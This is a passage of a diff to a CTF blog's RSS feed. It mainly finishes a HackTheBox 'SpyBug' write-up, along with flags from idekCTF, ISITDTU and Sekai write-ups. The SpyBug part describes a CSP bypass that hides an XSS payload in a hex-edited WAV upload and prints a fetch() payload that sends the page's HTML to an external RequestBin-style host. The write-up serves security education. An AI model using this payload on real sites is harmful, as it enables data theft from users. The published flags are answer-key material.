+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setHeader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Pragma&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setHeader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Expires&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;0&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">next&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>There is CSP rule set that only allows source from &lt;code>self&lt;/code>. What we were trying is called &lt;code>inline&lt;/code>. You can read the material &lt;a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass" target="_blank" rel="noopener">here&lt;/a>.&lt;/p>
+&lt;p>Don&amp;rsquo;t worry, I said 2 things come to my mind while reading the template. The second thing is that the audio use our uploaded &lt;code>WAV&lt;/code> file. There is a good &lt;a href="https://dttw.tech/posts/r1jswRaAG" target="_blank" rel="noopener">writeup&lt;/a> in the past that can clear your mind out. This challenge is more simple. It only checks the header, not the entire file. So we can use hexedit to edit the header of the file to &lt;code>WAV&lt;/code> header and include our xss payload. You can either use hexedit on your laptop or like me use an online hexeditor.&lt;/p>
+&lt;p>But does it used &lt;code>&amp;lt;audio&amp;gt;&lt;/code> tag, how can the script be executed ? You&amp;rsquo;re right, we can&amp;rsquo;t. However if something like &lt;code>&amp;lt;script src=&amp;quot;our-evil-media-file.wav&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code> appears, it will execute our payload like a charm. Well how can we make it appear ?
+Use &lt;code>!{hostname}&lt;/code> obviously.&lt;/p>
+&lt;img src="spybug2.png" alt="Hex edit">
+&lt;p>Okay let&amp;rsquo;s go and try out our web built from the docker at &lt;code>localhost:1337&lt;/code>. We can use &lt;code>admin:admin&lt;/code> to login to the panel now.&lt;/p>
+&lt;img src="spybug3.png" alt="Admin panel">
+&lt;p>You can either create a form with html to deal with the endpoints and upload file or use &lt;code>Postman&lt;/code> to deal with it like me.&lt;/p>
+&lt;p>First me need to register an agent.&lt;/p>
+&lt;img src="spybug4.png" alt="Register agent">
+&lt;p>Use the id and token returned for uploading the file that contains the payload.&lt;/p>
+&lt;img src="spybug5.png" alt="Upload payload agent">
+&lt;p>And finally, inject into html.&lt;/p>
+&lt;img src="spybug6.png" alt="Upload payload agent">
+&lt;img src="spybug7.png" alt="Alert 1">
+&lt;p>Spectacular !! Now we only need to modify our payload for it to get all content of the html page at send it to our self hosted server or maybe &lt;a href="https://requestbin.com" target="_blank" rel="noopener">RequestBin&lt;/a>. The payload I used:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// change the url of the requestbin
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;https://ensei2x093jq8.x.pipedream.net?muneh=&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">documentElement&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Repeat all the steps above against challenge server. We will see the flag in the RequestBin we created.&lt;/p>
+&lt;img src="spybug8.png" alt="Money">
+&lt;p>Flag: &lt;code>HTB{p01yg10t5_4nd_35p10n4g3}&lt;/code>&lt;/p>
+&lt;h2 id="traptrack-hard-coming-soon">TrapTrack (hard) (coming soon)&lt;/h2></description></item><item><title>idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who</title><link>https://blog.bkisc.com/blog/fazect/idekctf2022_osintcrime3/</link><pubDate>Mon, 16 Jan 2023 03:50:54 +0000</pubDate><guid>https://blog.bkisc.com/blog/fazect/idekctf2022_osintcrime3/</guid><description>
+&lt;details class="toc-inpage d-print-none " open>
 &lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
 &lt;nav id="TableOfContents">
 &lt;ul>
@@ -847,7 +1112,8 @@
 &lt;img src="flag.png" alt="Flag" width="1000"/>
 &lt;p>Concatenate the first letters of the last &lt;strong>7 sentences&lt;/strong> of the poem, we have our flag for the challenge: &lt;strong>idek{JULIANA_APOSIDM723489}&lt;/strong>.&lt;/p>
 &lt;h2 id="conclusion">Conclusion&lt;/h2>
-&lt;p>A good OSINT challenge overall, consist of several general skills in the field of OSINT, such as &lt;strong>using Wayback Machine&lt;/strong> or &lt;strong>finding locations on Google Maps&lt;/strong>.&lt;/p></description></item><item><title>ISITDTU CTF 2022 Finals - Slow</title><link>https://blog.bkisc.com/blog/fazect/isitdtu-2022-slow/</link><pubDate>Fri, 13 Jan 2023 15:44:54 +0000</pubDate><guid>https://blog.bkisc.com/blog/fazect/isitdtu-2022-slow/</guid><description>&lt;details class="toc-inpage d-print-none " open>
+&lt;p>A good OSINT challenge overall, consist of several general skills in the field of OSINT, such as &lt;strong>using Wayback Machine&lt;/strong> or &lt;strong>finding locations on Google Maps&lt;/strong>.&lt;/p></description></item><item><title>ISITDTU CTF 2022 Finals - Slow</title><link>https://blog.bkisc.com/blog/fazect/isitdtu-2022-slow/</link><pubDate>Fri, 13 Jan 2023 15:44:54 +0000</pubDate><guid>https://blog.bkisc.com/blog/fazect/isitdtu-2022-slow/</guid><description>
+&lt;details class="toc-inpage d-print-none " open>
 &lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
 &lt;nav id="TableOfContents">
 &lt;ul>
@@ -1010,7 +1276,8 @@
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">fazect@LAPTOP-CQA118DI:/mnt/d/Downloads$ ./slow.exe
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RESULT: 75025
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag is: Pr4ct1c3_VMc0d3_w1th_F1b0n4cc1
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Wrap the flag with &lt;strong>ISITDTU{}&lt;/strong>, we have our flag for the challenge: &lt;strong>ISITDTU{Pr4ct1c3_VMc0d3_w1th_F1b0n4cc1}&lt;/strong>.&lt;/p></description></item><item><title>Sekai CTF 2022 Bottle Poem</title><link>https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/</link><pubDate>Thu, 12 Jan 2023 00:00:00 +0000</pubDate><guid>https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/</guid><description>&lt;details class="toc-inpage d-print-none " open>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Wrap the flag with &lt;strong>ISITDTU{}&lt;/strong>, we have our flag for the challenge: &lt;strong>ISITDTU{Pr4ct1c3_VMc0d3_w1th_F1b0n4cc1}&lt;/strong>.&lt;/p></description></item><item><title>Sekai CTF 2022 Bottle Poem</title><link>https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/</link><pubDate>Thu, 12 Jan 2023 00:00:00 +0000</pubDate><guid>https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/</guid><description>
+&lt;details class="toc-inpage d-print-none " open>
 &lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
 &lt;nav id="TableOfContents">
 &lt;ul>
